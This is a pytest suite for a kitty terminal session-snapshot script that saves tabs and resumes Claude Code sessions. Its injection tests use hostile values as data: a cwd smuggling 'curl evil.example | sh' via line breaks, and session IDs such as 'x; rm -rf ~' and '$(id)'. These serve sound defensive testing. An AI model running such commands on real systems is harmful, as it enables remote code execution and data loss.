from __future__ import annotations

import importlib.util
import json
import os
import shlex
import stat
import subprocess
import sys
import types
from pathlib import Path
from typing import TYPE_CHECKING

import pytest

if TYPE_CHECKING:
    from collections.abc import Callable
    from types import ModuleType

REPO_ROOT = Path(__file__).resolve().parents[2]
KITTY_SESSION = REPO_ROOT / "roles/devbox/files/.config/kitty/kitty_session.py"
HOME = "/home/user"
SHELL = "/opt/homebrew/bin/fish"
SESSION_ID = "0f3c9a52-7b1e-4d6a-9c10-5e8d2a4b6f70"


@pytest.fixture
def home_dir(tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path_factory.mktemp("home")
    monkeypatch.setenv("HOME", str(home))
    return home


@pytest.fixture
def ks(home_dir: Path, monkeypatch: pytest.MonkeyPatch) -> ModuleType:
    assert home_dir.is_dir()
    monkeypatch.delenv("KITTY_PID", raising=False)
    spec = importlib.util.spec_from_file_location("kitty_session", KITTY_SESSION)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    monkeypatch.setitem(sys.modules, spec.name, module)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def inside_kitty(ks: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    assert ks is not None
    monkeypatch.setenv("KITTY_PID", "4242")


@pytest.fixture
def fixed_fish(ks: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ks, "resolve_fish", lambda: SHELL)


def make_window(
    window_id: int,
    *,
    cwd: object = "/window/cwd",
    processes: list[object] | None = None,
) -> dict[str, object]:
    return {"id": window_id, "cwd": cwd, "foreground_processes": processes or []}


def make_tab(
    windows: list[dict[str, object]],
    *,
    title: object = "tab",
    layout: object = "splits",
) -> dict[str, object]:
    return {
        "id": 1,
        "title": title,
        "layout": layout,
        "windows": windows,
        "groups": [{"id": w["id"], "windows": [w["id"]]} for w in windows],
    }


def single_tab_os_window(tab: dict[str, object]) -> list[object]:
    return [{"is_focused": True, "tabs": [tab]}]


def no_claude(_pid: int) -> None:
    return None


def claude_lookup(ks: ModuleType, found: dict[int, tuple[str, str]]) -> Callable[[int], object]:
    def lookup(pid: int) -> object:
        if pid not in found:
            return None
        session_id, cwd = found[pid]
        return ks.ClaudeSession(session_id=session_id, cwd=cwd)

    return lookup


def launch_lines(text: str) -> list[str]:
    return [line for line in text.splitlines() if line.startswith("launch ")]


class TestFocusedOsWindow:
    def test_focused_window_wins_over_the_first(self, ks: ModuleType) -> None:
        first = {"is_focused": False, "tabs": [make_tab([make_window(1)], title="first")]}
        second = {"is_focused": True, "tabs": [make_tab([make_window(2)], title="second")]}

        rendered = ks.render_session([first, second], no_claude, HOME, SHELL)

        assert "new_tab second" in rendered.text
        assert "new_tab first" not in rendered.text

    def test_first_window_is_used_when_none_is_focused(self, ks: ModuleType) -> None:
        first = {"is_focused": False, "tabs": [make_tab([make_window(1)], title="first")]}
        second = {"tabs": [make_tab([make_window(2)], title="second")]}

        rendered = ks.render_session([first, second], no_claude, HOME, SHELL)

        assert "new_tab first" in rendered.text
        assert "new_tab second" not in rendered.text

    def test_non_dict_entries_are_skipped_when_choosing(self, ks: ModuleType) -> None:
        real = {"tabs": [make_tab([make_window(1)], title="real")]}

        rendered = ks.render_session(["junk", None, 7, real], no_claude, HOME, SHELL)

        assert "new_tab real" in rendered.text

    @pytest.mark.parametrize("os_windows", [[], ["junk"], [None, 3]])
    def test_no_usable_os_window_raises(self, ks: ModuleType, os_windows: list[object]) -> None:
        with pytest.raises(ks.SnapshotError):
            ks.render_session(os_windows, no_claude, HOME, SHELL)


class TestRenderSessionTabs:
    def test_each_tab_is_a_block_with_title_layout_launches_and_blank_line(
        self, ks: ModuleType
    ) -> None:
        tab_a = make_tab(
            [make_window(1, cwd="/a"), make_window(2, cwd="/b")], title="Work", layout="splits"
        )
        tab_b = make_tab([make_window(3, cwd="/c")], title="Logs", layout="tall")
        os_windows = [{"is_focused": True, "tabs": [tab_a, tab_b]}]

        rendered = ks.render_session(os_windows, no_claude, HOME, SHELL)

        assert rendered.text == (
            "new_tab Work\n"
            "layout splits\n"
            f"launch --cwd /a {SHELL}\n"
            f"launch --cwd /b {SHELL}\n"
            "\n"
            "new_tab Logs\n"
            "layout tall\n"
            f"launch --cwd /c {SHELL}\n"
        )
        assert rendered.tab_count == 2

    def test_splits_follow_group_order_not_window_list_order(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1, cwd="/one"), make_window(2, cwd="/two")])
        tab["groups"] = [{"id": 2, "windows": [2]}, {"id": 1, "windows": [1]}]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [
            f"launch --cwd /two {SHELL}",
            f"launch --cwd /one {SHELL}",
        ]

    def test_tab_count_counts_only_tabs_that_were_emitted(self, ks: ModuleType) -> None:
        empty_tab = {"id": 9, "title": "empty", "layout": "splits", "windows": [], "groups": []}
        full_tab = make_tab([make_window(1)], title="full")
        os_windows = [{"is_focused": True, "tabs": [empty_tab, full_tab, empty_tab]}]

        rendered = ks.render_session(os_windows, no_claude, HOME, SHELL)

        assert rendered.tab_count == 1
        assert rendered.text.count("new_tab ") == 1

    def test_overlay_in_a_group_is_dropped(self, ks: ModuleType) -> None:
        base = make_window(1, cwd="/base")
        overlay = make_window(2, cwd="/overlay")
        tab = make_tab([base, overlay])
        tab["groups"] = [{"id": 1, "windows": [1, 2]}]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [f"launch --cwd /base {SHELL}"]

    def test_dock_group_is_skipped(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1, cwd="/main"), make_window(2, cwd="/dock")])
        tab["groups"] = [
            {"id": 1, "windows": [1]},
            {"id": 2, "windows": [2], "dock": {"edge": "bottom"}},
        ]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [f"launch --cwd /main {SHELL}"]

    def test_missing_groups_restores_every_window(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1, cwd="/a"), make_window(2, cwd="/b")])
        del tab["groups"]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [
            f"launch --cwd /a {SHELL}",
            f"launch --cwd /b {SHELL}",
        ]

    def test_group_pointing_at_an_unknown_window_is_ignored(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1, cwd="/a"), make_window(2, cwd="/b")])
        tab["groups"] = [{"id": 1, "windows": [99, 1]}, {"id": 2, "windows": [2]}]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [f"launch --cwd /b {SHELL}"]


class TestRenderSessionClaude:
    def test_claude_split_resumes_the_conversation_in_the_recorded_cwd(
        self, ks: ModuleType
    ) -> None:
        window = make_window(
            1,
            cwd="/window/cwd",
            processes=[{"pid": 10, "cwd": "/process/cwd"}, {"pid": 11, "cwd": "/process/cwd"}],
        )
        lookup = claude_lookup(ks, {11: (SESSION_ID, "/repo/recorded")})

        rendered = ks.render_session(single_tab_os_window(make_tab([window])), lookup, HOME, SHELL)

        (line,) = launch_lines(rendered.text)
        assert shlex.split(line) == [
            "launch",
            "--cwd",
            "/repo/recorded",
            SHELL,
            "-C",
            f"claude --resume {SESSION_ID}",
        ]

    def test_the_first_foreground_pid_with_a_session_wins(self, ks: ModuleType) -> None:
        window = make_window(1, processes=[{"pid": 10}, {"pid": 11}, {"pid": 12}])
        lookup = claude_lookup(ks, {11: ("first-id", "/one"), 12: ("second-id", "/two")})

        rendered = ks.render_session(single_tab_os_window(make_tab([window])), lookup, HOME, SHELL)

        (line,) = launch_lines(rendered.text)
        assert "first-id" in line
        assert "second-id" not in line

    def test_claude_and_plain_splits_can_share_a_tab(self, ks: ModuleType) -> None:
        claude_window = make_window(1, processes=[{"pid": 10}])
        plain_window = make_window(2, cwd="/plain", processes=[{"pid": 20}])
        lookup = claude_lookup(ks, {10: (SESSION_ID, "/repo")})

        rendered = ks.render_session(
            single_tab_os_window(make_tab([claude_window, plain_window])), lookup, HOME, SHELL
        )

        claude_line, plain_line = launch_lines(rendered.text)
        assert f"claude --resume {SESSION_ID}" in claude_line
        assert plain_line == f"launch --cwd /plain {SHELL}"

    def test_claude_cwd_with_spaces_and_quotes_round_trips(self, ks: ModuleType) -> None:
        cwd = '/Users/me/My Projects/it\'s "quoted"'
        window = make_window(1, processes=[{"pid": 10}])
        lookup = claude_lookup(ks, {10: (SESSION_ID, cwd)})

        rendered = ks.render_session(single_tab_os_window(make_tab([window])), lookup, HOME, SHELL)

        (line,) = launch_lines(rendered.text)
        assert shlex.split(line)[2] == cwd


class TestRenderSessionCwd:
    @pytest.mark.parametrize(
        ("processes", "window_cwd", "expected"),
        [
            pytest.param(
                [{"pid": 1, "cwd": "/p1"}, {"pid": 2, "cwd": "/p2"}],
                "/w",
                "/p1",
                id="first-process",
            ),
            pytest.param(
                [{"pid": 1, "cwd": ""}, {"pid": 2, "cwd": "/p2"}], "/w", "/p2", id="skips-empty"
            ),
            pytest.param(
                [{"pid": 1, "cwd": 123}, {"pid": 2}, {"pid": 3, "cwd": "/p3"}],
                "/w",
                "/p3",
                id="skips-non-string",
            ),
            pytest.param([{"pid": 1}], "/w", "/w", id="window-cwd"),
            pytest.param([], "/w", "/w", id="no-processes"),
            pytest.param([{"pid": 1, "cwd": ""}], "", HOME, id="empty-window-cwd-falls-to-home"),
            pytest.param([], None, HOME, id="no-cwd-at-all"),
            pytest.param([], 42, HOME, id="non-string-window-cwd"),
        ],
    )
    def test_plain_split_cwd_fallback_order(
        self,
        ks: ModuleType,
        processes: list[object],
        window_cwd: object,
        expected: str,
    ) -> None:
        window = make_window(1, cwd=window_cwd, processes=processes)

        rendered = ks.render_session(
            single_tab_os_window(make_tab([window])), no_claude, HOME, SHELL
        )

        assert launch_lines(rendered.text) == [f"launch --cwd {expected} {SHELL}"]

    def test_window_without_a_foreground_processes_key_uses_window_cwd(
        self, ks: ModuleType
    ) -> None:
        window: dict[str, object] = {"id": 1, "cwd": "/w"}

        rendered = ks.render_session(
            single_tab_os_window(make_tab([window])), no_claude, HOME, SHELL
        )

        assert launch_lines(rendered.text) == [f"launch --cwd /w {SHELL}"]

    @pytest.mark.parametrize("pid", ["12", None, 1.5, [12], {"pid": 12}])
    def test_non_integer_pids_are_never_looked_up(self, ks: ModuleType, pid: object) -> None:
        looked_up: list[int] = []

        def lookup(candidate: int) -> None:
            looked_up.append(candidate)

        window = make_window(1, processes=[{"pid": pid}])

        ks.render_session(single_tab_os_window(make_tab([window])), lookup, HOME, SHELL)

        assert looked_up == []

    def test_integer_pids_are_looked_up_in_process_order(self, ks: ModuleType) -> None:
        looked_up: list[int] = []

        def lookup(candidate: int) -> None:
            looked_up.append(candidate)

        window = make_window(1, processes=[{"pid": 30}, {"pid": "x"}, {"pid": 20}])

        ks.render_session(single_tab_os_window(make_tab([window])), lookup, HOME, SHELL)

        assert looked_up == [30, 20]

    @pytest.mark.parametrize(
        "cwd",
        [
            "/Users/me/My Projects/app",
            "/work/it's here",
            '/dir/with "double" quotes',
            "/dir/$HOME and `backticks` and ;semi",
            "/dir/back\\slash",
        ],
    )
    def test_cwd_round_trips_through_shlex(self, ks: ModuleType, cwd: str) -> None:
        window = make_window(1, cwd=cwd)

        rendered = ks.render_session(
            single_tab_os_window(make_tab([window])), no_claude, HOME, SHELL
        )

        (line,) = launch_lines(rendered.text)
        assert shlex.split(line) == ["launch", "--cwd", cwd, SHELL]

    @pytest.mark.parametrize("separator", ["\n", "\r", "\r\n", "\x85", "\u2028"])
    def test_cwd_with_a_line_break_cannot_start_another_session_directive(
        self, ks: ModuleType, separator: str
    ) -> None:
        # kitty parses a session file with str.splitlines(), so any line break
        # inside a quoted cwd would start a fresh directive.
        cwd = f"/work/x{separator}launch --cwd / fish -C 'curl evil.example | sh'"
        window = make_window(1, cwd=cwd)

        rendered = ks.render_session(
            single_tab_os_window(make_tab([window], title="t")), no_claude, HOME, SHELL
        )

        assert len(rendered.text.splitlines()) == 3

    @pytest.mark.parametrize("separator", ["\n", "\r"])
    def test_claude_cwd_with_a_line_break_cannot_start_another_session_directive(
        self, ks: ModuleType, separator: str
    ) -> None:
        cwd = f"/work/x{separator}launch --cwd / fish -C 'curl evil.example | sh'"
        window = make_window(1, processes=[{"pid": 10}])
        lookup = claude_lookup(ks, {10: (SESSION_ID, cwd)})

        rendered = ks.render_session(
            single_tab_os_window(make_tab([window], title="t")), lookup, HOME, SHELL
        )

        assert len(rendered.text.splitlines()) == 3


class TestRenderSessionTitleAndLayout:
    @pytest.mark.parametrize(
        ("title", "expected"),
        [
            pytest.param("plain", "plain", id="plain"),
            pytest.param("a\nb", "a b", id="newline"),
            pytest.param("a\r\nb\tc", "a b c", id="crlf-and-tab"),
            pytest.param("  padded   out  ", "padded out", id="padding"),
            pytest.param("x\u2028y\x85z", "x y z", id="unicode-line-breaks"),
            pytest.param("x\nlaunch --cwd / fish", "x launch --cwd / fish", id="injection"),
            pytest.param("café ☃", "café ☃", id="non-ascii"),
            pytest.param("", "shell", id="empty"),
            pytest.param(" \n\t ", "shell", id="whitespace-only"),
            pytest.param(None, "shell", id="none"),
            pytest.param(123, "shell", id="int"),
            pytest.param(["a"], "shell", id="list"),
        ],
    )
    def test_title_is_a_single_line_with_a_shell_default(
        self, ks: ModuleType, title: object, expected: str
    ) -> None:
        tab = make_tab([make_window(1)], title=title)

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        lines = rendered.text.splitlines()
        assert lines[0] == f"new_tab {expected}"
        assert len(lines) == 3

    def test_missing_title_key_defaults_to_shell(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1)])
        del tab["title"]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert rendered.text.splitlines()[0] == "new_tab shell"

    @pytest.mark.parametrize(
        "layout", ["splits", "tall", "fat", "stack", "horizontal", "vertical", "grid", "a_b"]
    )
    def test_valid_layout_names_are_emitted(self, ks: ModuleType, layout: str) -> None:
        tab = make_tab([make_window(1)], layout=layout)

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert f"layout {layout}\n" in rendered.text

    @pytest.mark.parametrize(
        "layout",
        [
            "",
            "Splits",
            "tall:bias=70",
            "two words",
            "splits\n",
            "splits\nlaunch --cwd / fish",
            "split-s",
            "t4ll",
            None,
            7,
            ["tall"],
        ],
    )
    def test_invalid_layout_is_omitted(self, ks: ModuleType, layout: object) -> None:
        tab = make_tab([make_window(1)], layout=layout)

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert rendered.text.splitlines() == ["new_tab tab", f"launch --cwd /window/cwd {SHELL}"]

    def test_missing_layout_key_is_omitted(self, ks: ModuleType) -> None:
        tab = make_tab([make_window(1)])
        del tab["layout"]

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert "layout" not in rendered.text


class TestRenderSessionMalformedInput:
    @pytest.mark.parametrize(
        "os_windows",
        [
            pytest.param([{}], id="no-tabs-key"),
            pytest.param([{"tabs": None}], id="tabs-none"),
            pytest.param([{"tabs": "tabs"}], id="tabs-string"),
            pytest.param([{"tabs": []}], id="tabs-empty"),
            pytest.param([{"tabs": ["junk", 3, None]}], id="tabs-not-dicts"),
            pytest.param([{"tabs": [{"title": "t"}]}], id="tab-without-windows"),
            pytest.param([{"tabs": [{"windows": []}]}], id="tab-with-empty-windows"),
            pytest.param([{"tabs": [{"windows": "w"}]}], id="windows-string"),
            pytest.param([{"tabs": [{"windows": ["junk", None]}]}], id="windows-not-dicts"),
        ],
    )
    def test_a_snapshot_without_a_restorable_window_raises_snapshot_error(
        self, ks: ModuleType, os_windows: list[object]
    ) -> None:
        with pytest.raises(ks.SnapshotError):
            ks.render_session(os_windows, no_claude, HOME, SHELL)

    @pytest.mark.parametrize(
        "extra",
        [
            pytest.param({"foreground_processes": "garbage"}, id="processes-string"),
            pytest.param({"foreground_processes": None}, id="processes-none"),
            pytest.param({"foreground_processes": ["junk", 4, None]}, id="processes-not-dicts"),
            pytest.param(
                {"foreground_processes": [{"pid": 3, "cwd": None}]}, id="process-cwd-none"
            ),
            pytest.param({"cwd": None}, id="window-cwd-none"),
        ],
    )
    def test_malformed_window_fields_fall_back_to_home(
        self, ks: ModuleType, extra: dict[str, object]
    ) -> None:
        window: dict[str, object] = {"id": 1, **extra}
        tab = make_tab([window])

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [f"launch --cwd {HOME} {SHELL}"]

    @pytest.mark.parametrize(
        "groups",
        [
            pytest.param("groups", id="groups-string"),
            pytest.param(None, id="groups-none"),
            pytest.param(["junk", 1], id="groups-not-dicts"),
            pytest.param([{"id": 1}], id="group-without-windows"),
            pytest.param([{"id": 1, "windows": "1"}], id="group-windows-string"),
            pytest.param([{"id": 1, "windows": []}], id="group-windows-empty"),
        ],
    )
    def test_malformed_groups_fall_back_to_every_window(
        self, ks: ModuleType, groups: object
    ) -> None:
        tab = make_tab([make_window(1, cwd="/a"), make_window(2, cwd="/b")])
        tab["groups"] = groups

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [
            f"launch --cwd /a {SHELL}",
            f"launch --cwd /b {SHELL}",
        ]

    @pytest.mark.parametrize(
        "groups",
        [
            pytest.param([{"id": 1, "windows": [[1]]}], id="group-head-is-a-list"),
            pytest.param([{"id": 1, "windows": [{"id": 1}]}], id="group-head-is-a-dict"),
        ],
    )
    def test_unhashable_group_head_does_not_raise(self, ks: ModuleType, groups: object) -> None:
        tab = make_tab([make_window(1, cwd="/a")])
        tab["groups"] = groups

        rendered = ks.render_session(single_tab_os_window(tab), no_claude, HOME, SHELL)

        assert launch_lines(rendered.text) == [f"launch --cwd /a {SHELL}"]


class TestReadClaudeSession:
    @staticmethod
    def write_record(sessions_dir: Path, pid: int, record: object) -> None:
        sessions_dir.mkdir(parents=True, exist_ok=True)
        (sessions_dir / f"{pid}.json").write_text(json.dumps(record), encoding="utf-8")

    @staticmethod
    def valid_record(pid: int) -> dict[str, object]:
        return {"pid": pid, "kind": "interactive", "sessionId": SESSION_ID, "cwd": "/repo"}

    def test_valid_record_is_returned(self, ks: ModuleType, tmp_path: Path) -> None:
        self.write_record(tmp_path, 4242, self.valid_record(4242))

        session = ks.read_claude_session(4242, tmp_path)

        assert session == ks.ClaudeSession(session_id=SESSION_ID, cwd="/repo")

    def test_extra_record_fields_are_ignored(self, ks: ModuleType, tmp_path: Path) -> None:
        record = {**self.valid_record(7), "name": "x", "startedAt": 1}
        self.write_record(tmp_path, 7, record)

        session = ks.read_claude_session(7, tmp_path)

        assert session == ks.ClaudeSession(session_id=SESSION_ID, cwd="/repo")

    def test_default_sessions_dir_is_under_the_home_directory(
        self, ks: ModuleType, home_dir: Path
    ) -> None:
        self.write_record(home_dir / ".claude" / "sessions", 55, self.valid_record(55))

        session = ks.read_claude_session(55)

        assert session == ks.ClaudeSession(session_id=SESSION_ID, cwd="/repo")

    def test_missing_file_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        assert ks.read_claude_session(1, tmp_path) is None

    def test_missing_sessions_dir_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        assert ks.read_claude_session(1, tmp_path / "absent") is None

    def test_a_directory_in_place_of_the_file_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        (tmp_path / "9.json").mkdir()

        assert ks.read_claude_session(9, tmp_path) is None

    def test_only_the_record_of_the_given_pid_is_read(self, ks: ModuleType, tmp_path: Path) -> None:
        self.write_record(tmp_path, 100, self.valid_record(100))

        assert ks.read_claude_session(101, tmp_path) is None

    @pytest.mark.parametrize(
        "raw",
        [
            pytest.param(b"", id="empty-file"),
            pytest.param(b"{not json", id="invalid-json"),
            pytest.param(b'{"pid": 5, "kind"', id="truncated-json"),
            pytest.param(b"\xff\xfe\x00{", id="non-utf8"),
            pytest.param(b"\x80abc", id="invalid-start-byte"),
        ],
    )
    def test_unreadable_content_is_none(self, ks: ModuleType, tmp_path: Path, raw: bytes) -> None:
        (tmp_path / "5.json").write_bytes(raw)

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize(
        "record",
        [
            pytest.param([], id="list"),
            pytest.param([{"pid": 5}], id="list-of-record"),
            pytest.param("text", id="string"),
            pytest.param(5, id="number"),
            pytest.param(None, id="null"),
        ],
    )
    def test_json_that_is_not_an_object_is_none(
        self, ks: ModuleType, tmp_path: Path, record: object
    ) -> None:
        self.write_record(tmp_path, 5, record)

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize("recorded_pid", [6, "5", None, 0, -5])
    def test_pid_mismatch_is_none(
        self, ks: ModuleType, tmp_path: Path, recorded_pid: object
    ) -> None:
        self.write_record(tmp_path, 5, {**self.valid_record(5), "pid": recorded_pid})

        assert ks.read_claude_session(5, tmp_path) is None

    def test_record_without_pid_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        record = self.valid_record(5)
        del record["pid"]
        self.write_record(tmp_path, 5, record)

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize(
        "kind", ["print", "headless", "Interactive", "", None, 1, ["interactive"]]
    )
    def test_kind_other_than_interactive_is_none(
        self, ks: ModuleType, tmp_path: Path, kind: object
    ) -> None:
        self.write_record(tmp_path, 5, {**self.valid_record(5), "kind": kind})

        assert ks.read_claude_session(5, tmp_path) is None

    def test_record_without_kind_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        record = self.valid_record(5)
        del record["kind"]
        self.write_record(tmp_path, 5, record)

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize(
        "session_id",
        [
            "",
            "x; rm -rf ~",
            "abc def",
            "abc\n",
            "abc\nrm -rf ~",
            "$(id)",
            "`id`",
            "a'b",
            'a"b',
            "../etc",
            "a/b",
            "idé",
            None,
            123,
            ["abc"],
        ],
    )
    def test_empty_or_unsafe_session_id_is_none(
        self, ks: ModuleType, tmp_path: Path, session_id: object
    ) -> None:
        self.write_record(tmp_path, 5, {**self.valid_record(5), "sessionId": session_id})

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize("session_id", ["abc", "A-b_9", SESSION_ID, "9"])
    def test_plain_session_ids_are_accepted(
        self, ks: ModuleType, tmp_path: Path, session_id: str
    ) -> None:
        self.write_record(tmp_path, 5, {**self.valid_record(5), "sessionId": session_id})

        session = ks.read_claude_session(5, tmp_path)

        assert session == ks.ClaudeSession(session_id=session_id, cwd="/repo")

    def test_record_without_session_id_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        record = self.valid_record(5)
        del record["sessionId"]
        self.write_record(tmp_path, 5, record)

        assert ks.read_claude_session(5, tmp_path) is None

    @pytest.mark.parametrize("cwd", ["", "repo", "./repo", "../repo", "~/repo", None, 7, ["/repo"]])
    def test_relative_or_non_string_cwd_is_none(
        self, ks: ModuleType, tmp_path: Path, cwd: object
    ) -> None:
        self.write_record(tmp_path, 5, {**self.valid_record(5), "cwd": cwd})

        assert ks.read_claude_session(5, tmp_path) is None

    def test_record_without_cwd_is_none(self, ks: ModuleType, tmp_path: Path) -> None:
        record = self.valid_record(5)
        del record["cwd"]
        self.write_record(tmp_path, 5, record)

        assert ks.read_claude_session(5, tmp_path) is None


class TestWriteAtomically:
    def test_creates_the_file_and_its_parent_directories(
        self, ks: ModuleType, tmp_path: Path
    ) -> None:
        target = tmp_path / "a" / "b" / "last-session.conf"

        ks.write_atomically(target, "new_tab x\n")

        assert target.read_text(encoding="utf-8") == "new_tab x\n"

    def test_replaces_existing_content_and_leaves_no_temporary_file(
        self, ks: ModuleType, tmp_path: Path
    ) -> None:
        target = tmp_path / "last-session.conf"
        target.write_text("old content that is longer than the new one", encoding="utf-8")

        ks.write_atomically(target, "new")

        assert target.read_text(encoding="utf-8") == "new"
        assert list(tmp_path.iterdir()) == [target]

    def test_non_ascii_text_is_written_as_utf8(self, ks: ModuleType, tmp_path: Path) -> None:
        target = tmp_path / "last-session.conf"
        text = "new_tab café ☃\n"

        ks.write_atomically(target, text)

        assert target.read_bytes() == text.encode("utf-8")

    def test_failed_write_keeps_the_old_file_and_removes_the_temporary_one(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        target = tmp_path / "last-session.conf"
        target.write_bytes(b"previous snapshot")

        def failing_fsync(_descriptor: int) -> None:
            message = "disk full"
            raise OSError(message)

        monkeypatch.setattr(ks.os, "fsync", failing_fsync)

        with pytest.raises(OSError, match="disk full"):
            ks.write_atomically(target, "new")

        assert target.read_bytes() == b"previous snapshot"
        assert list(tmp_path.iterdir()) == [target]

    def test_failed_replace_removes_the_temporary_file(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        target = tmp_path / "last-session.conf"

        def failing_replace(_self: Path, _target: object) -> Path:
            message = "cross-device link"
            raise OSError(message)

        monkeypatch.setattr(Path, "replace", failing_replace)

        with pytest.raises(OSError, match="cross-device link"):
            ks.write_atomically(target, "new")

        assert list(tmp_path.iterdir()) == []

    def test_target_that_is_a_non_empty_directory_raises_and_leaves_it_intact(
        self, ks: ModuleType, tmp_path: Path
    ) -> None:
        target = tmp_path / "last-session.conf"
        target.mkdir()
        (target / "keep").write_text("x", encoding="utf-8")

        with pytest.raises(IsADirectoryError):
            ks.write_atomically(target, "new")

        assert [path.name for path in tmp_path.iterdir()] == ["last-session.conf"]
        assert (target / "keep").read_text(encoding="utf-8") == "x"


def kitty_ls_returning(output: str) -> Callable[..., subprocess.CompletedProcess[str]]:
    def run(command: list[str], **_kwargs: object) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(command, 0, stdout=output, stderr="")

    return run


def kitty_ls_raising(error: Exception) -> Callable[..., subprocess.CompletedProcess[str]]:
    def run(_command: list[str], **_kwargs: object) -> subprocess.CompletedProcess[str]:
        raise error

    return run


KITTY_LS_COMMAND_FAILURES = [
    pytest.param(kitty_ls_raising(FileNotFoundError("kitty")), id="kitty-not-found"),
    pytest.param(
        kitty_ls_raising(subprocess.CalledProcessError(1, ["kitty", "@", "ls"])), id="exit-status"
    ),
    pytest.param(
        kitty_ls_raising(subprocess.TimeoutExpired(["kitty", "@", "ls"], 2)), id="timeout"
    ),
    pytest.param(kitty_ls_raising(PermissionError("denied")), id="permission"),
    pytest.param(kitty_ls_returning(""), id="empty-output"),
    pytest.param(kitty_ls_returning("not json"), id="invalid-json"),
]
KITTY_LS_NOT_A_LIST = [
    pytest.param(kitty_ls_returning('{"tabs": []}'), id="json-object"),
    pytest.param(kitty_ls_returning('"text"'), id="json-string"),
    pytest.param(kitty_ls_returning("null"), id="json-null"),
]


def one_tab_ls_output(cwd: str = "/work", pid: int = 31337) -> str:
    window = make_window(1, cwd=cwd, processes=[{"pid": pid, "cwd": cwd}])
    return json.dumps(single_tab_os_window(make_tab([window], title="main")))


@pytest.mark.usefixtures("inside_kitty")
class TestReadOsWindows:
    def test_returns_the_parsed_list_and_asks_kitty_for_ls(
        self, ks: ModuleType, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        calls: list[tuple[list[str], dict[str, object]]] = []

        def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
            calls.append((command, kwargs))
            return subprocess.CompletedProcess(command, 0, stdout='[{"id": 1}]', stderr="")

        monkeypatch.setattr(ks.subprocess, "run", run)

        assert ks.read_os_windows() == [{"id": 1}]
        ((command, kwargs),) = calls
        assert command == ["kitty", "@", "ls"]
        assert kwargs["timeout"] == 2
        assert kwargs["check"] is True

    @pytest.mark.parametrize("run", KITTY_LS_COMMAND_FAILURES)
    def test_command_failure_becomes_a_snapshot_error_naming_remote_control(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        run: Callable[..., subprocess.CompletedProcess[str]],
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", run)

        with pytest.raises(ks.SnapshotError, match="allow_remote_control"):
            ks.read_os_windows()

    @pytest.mark.parametrize("run", KITTY_LS_NOT_A_LIST)
    def test_json_that_is_not_a_list_is_a_snapshot_error(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        run: Callable[..., subprocess.CompletedProcess[str]],
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", run)

        with pytest.raises(ks.SnapshotError, match="list"):
            ks.read_os_windows()


@pytest.mark.usefixtures("inside_kitty", "fixed_fish")
class TestSaveSnapshot:
    def test_writes_the_rendered_session_and_returns_the_tab_count(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output("/work")))
        monkeypatch.setattr(ks, "read_claude_session", lambda _pid: None)
        target = tmp_path / "out" / "last-session.conf"

        tab_count = ks.save_snapshot(target)

        assert tab_count == 1
        assert target.read_text(encoding="utf-8") == (
            f"new_tab main\nlayout splits\nlaunch --cwd /work {SHELL}\n"
        )

    def test_default_lookup_reads_claude_records_under_the_home_directory(
        self, ks: ModuleType, home_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        sessions_dir = home_dir / ".claude" / "sessions"
        sessions_dir.mkdir(parents=True)
        record = {"pid": 31337, "kind": "interactive", "sessionId": SESSION_ID, "cwd": "/repo"}
        (sessions_dir / "31337.json").write_text(json.dumps(record), encoding="utf-8")
